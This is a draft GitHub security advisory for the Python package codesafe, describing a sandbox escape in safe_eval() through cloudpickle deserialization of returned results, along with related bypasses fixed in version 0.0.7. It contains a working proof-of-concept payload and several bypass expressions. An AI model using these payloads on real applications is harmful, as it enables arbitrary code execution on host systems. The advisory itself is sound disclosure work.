<!--
Draft GitHub Security Advisory — paste the sections below into
https://github.com/Infinitode/CodeSafe/security/advisories/new

Suggestions for the form fields:
  Ecosystem:      pip
  Package name:   codesafe
  Affected:       >= 0.0.6, < 0.0.7  (patched: 0.0.7)
  Severity:       Critical
  CVSS 3.1:       9.8  (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
  CWE:            CWE-502 (Deserialization of Untrusted Data),
                  CWE-94  (Improper Control of Generation of Code)
  Credits:        Juan Lucas Armendares (Sunplace Solutions) — reporter
-->

# CodeSafe `safe_eval()` Remote Code Execution via Unsafe Result Deserialization

### Summary

`safe_eval()` evaluates an expression in a child process and returned the result to the parent by calling `cloudpickle.loads()` on it — **with full builtins, outside the sandbox it had just enforced**. An expression could therefore return an object whose `__reduce__` chain executes arbitrary code the moment the parent unpickles it. An attacker controlling only the expression gained code execution in the calling application, with its privileges, in the default configuration.

This is a distinct root cause from CVE-2026-133467 (the `__builtins__['exec']` subscript bypass fixed in 0.0.5): the AST checker and the child-process sandbox worked as intended. The flaw is on the return path, which the checker never inspected.

### Details

In 0.0.6, `codesafe/__init__.py` serialized every evaluation result inside the child:

```python
payload = cloudpickle.dumps(result)      # child
...
result = cloudpickle.loads(payload)      # parent — full builtins, no restrictions
```

`_check_ast()` only guards the expression that runs in the child. It never inspects the *value* the child sends back, and that value was deserialized in the parent by a pickle-family loader. Any object whose `__reduce__` returns a callable and its arguments is executed during unpickling, so returning such an object is equivalent to running code in the caller.

The PoC below builds exactly that object using AST nodes the checker allows:

- `type(...)` is a safe builtin;
- `lambda`, `list`, `zip`, `range`, `iter` are permitted nodes;
- `iter(cls, None)` instantiates `cls` without a `Call` node naming it, so the "only whitelisted call targets" rule never sees the instantiation;
- `lambda s: (lambda: eval, ())` returns a bare `Name` reference to `eval` (never a `Call`), which resolves lazily — and in the parent's namespace `eval` is the real builtin, unlike the child's restricted globals.

### Proof of concept

Verified on `codesafe==0.0.6` (PyPI), Linux, Python 3.11, default configuration (no `allow_attributes`, no `allowed_vars`/`allowed_builtins`):

```python
import os
from codesafe import safe_eval

marker = "/tmp/codesafe_parent_rce"
if os.path.exists(marker):
    os.unlink(marker)

code = f"import os; open({marker!r}, 'w').write(str(os.getpid()))"

Y  = ("type('Y', (), {'__call__': lambda s, *a: None, "
      "'__reduce__': lambda s: (lambda: eval, ())})")
mk = lambda c: f"list(zip(range(1), iter({c}, None)))[0][1]"
X  = f"type('X', (), {{'__reduce__': lambda s: ({mk(Y)}, ({code!r},))}})"

safe_eval(mk(X))

print(open(marker).read())   # the PARENT's PID, not the child's
```

The marker file contains the *parent* process ID, confirming that `code` ran in the caller — outside the sandboxed child. A minimal variant, `list(iter(type('X', (), {'__reduce__': lambda s: (eval, (code,))}), None))`, is equally effective against the 0.0.6 result channel.

**CVSS 3.1: 9.8** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. No flags or non-default options required.

### Related issues fixed in the same release

While validating the report, the following issues in the same boundary/validator family were found and fixed:

1. **Format-string attribute traversal** (Moderate) — `_check_ast()` only inspects literal `ast.Attribute` nodes. `'{0.__init__.__globals__[SECRET]}'.format(obj)` walks into `obj` from inside `str.format`, reading dunder attributes and mapping keys the checker never sees. With `allow_attributes=True` this leaked host globals and module internals. CVSS 3.1: 5.9 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`).
2. **Name-shadowing call bypass** — rebinding a safe-builtin name let an expression call a caller-supplied callable that was not on `allowed_function_calls`: `(len := host_callable)()`, `[host_callable() for len in [..]]`, `(lambda len: len())(host_callable)`. Reachable in the default configuration whenever `allowed_vars` contains callables.
3. **Callable indirection through builtins** — `sorted(xs, key=host_callable)` and `iter(host_callable, None)` invoke a callable that is never the target of an `ast.Call` node, so the "whitelisted call targets only" rule never applied.
4. **`__builtins__` exposure** — the name was readable (and mutable) from expressions.
5. **Control-flow exceptions reached the caller** — an expression returning or raising `SystemExit(1)` terminated the host process, and `KeyboardInterrupt`/`GeneratorExit` escaped `except Exception` handlers.
6. **`file_access` bypass** — the `file_access=False`/`network_access=False` filters ran before `allowed_builtins` was merged, so re-introducing `open` through `allowed_builtins` bypassed the flag.

### Patches

Fixed in **0.0.7**. The result boundary no longer involves pickle at all:

- The child encodes the result into plain, JSON-compatible primitives (a fixed set of tags) and sends that over a `multiprocessing.Pipe`. There is no `pickle`/`cloudpickle` anywhere on the evaluation path, and the `cloudpickle` dependency was removed.
- The parent rebuilds only plain data with a non-executable decoder: `None`, `bool`, `int`, `float`, `complex`, `str`, `bytes`, `Decimal`, `Fraction`, and — with the new `allow_objects=True` — `list`/`tuple`/`dict`/`set` of those (depth ≤ 100, ≤ 1M nodes, ≤ 1 MiB of string/bytes data).
- Lambdas, classes, modules, generators and instances of user-defined types now raise a clear `RuntimeError` instead of being serialized. **This removes a 0.0.6 feature**; it was also the attack surface.
- Exceptions cross the boundary as `(type name, message)` and are rebuilt from builtins only; `SystemExit`/`KeyboardInterrupt`/`GeneratorExit` arrive as `RuntimeError`, and user-defined exception types are reported as `RuntimeError`.
- The AST checker additionally: rejects format-string templates that name attributes or keys; treats rebound names via `allowed_vars` as data (calls require `allowed_function_calls`); applies the same policy to callables passed to `sorted`/`iter`/etc.; rejects every use of `__builtins__` and the other reserved names; and applies `file_access`/`network_access` after `allowed_builtins` is merged.
- Int-to-str conversion is capped for the duration of a call so a returned giant integer cannot burn CPU in the caller.

Upgrade with:

```bash
pip install --upgrade "codesafe>=0.0.7"
```

### Workarounds

There is no complete workaround for 0.0.6 short of not passing untrusted input to `safe_eval()`: any expression that can return an object is sufficient. If upgrading immediately is not possible, run evaluations in a separate process/container that shares no privileges with the caller, and treat every evaluated expression as fully trusted.

### Impact

Any application on 0.0.6 that passes untrusted expressions to `safe_eval()`, with the default options. An attacker can execute arbitrary code in the host application's process — read and modify data, exfiltrate secrets, move laterally — defeating the purpose of the sandbox entirely.

### Credits

Reported by **Juan Lucas Armendares** ([Sunplace Solutions](mailto:juanlucas.armendares@sunplace.solutions)).

### References

- [PyPI — codesafe](https://pypi.org/project/codesafe/)
- [GitHub — Infinitode/CodeSafe](https://github.com/Infinitode/CodeSafe)
- [GHSA-7gp8-3j6q-v4h8](https://github.com/Infinitode/CodeSafe/security/advisories/GHSA-7gp8-3j6q-v4h8) — CVE-2026-133467, sandbox escape via indirect subscript call (fixed in 0.0.5)
- [GHSA-m85r-gp57-6p5q](https://github.com/Infinitode/CodeSafe/security/advisories/GHSA-m85r-gp57-6p5q) — sandbox escape via dunder attribute string argument (fixed in 0.0.6)
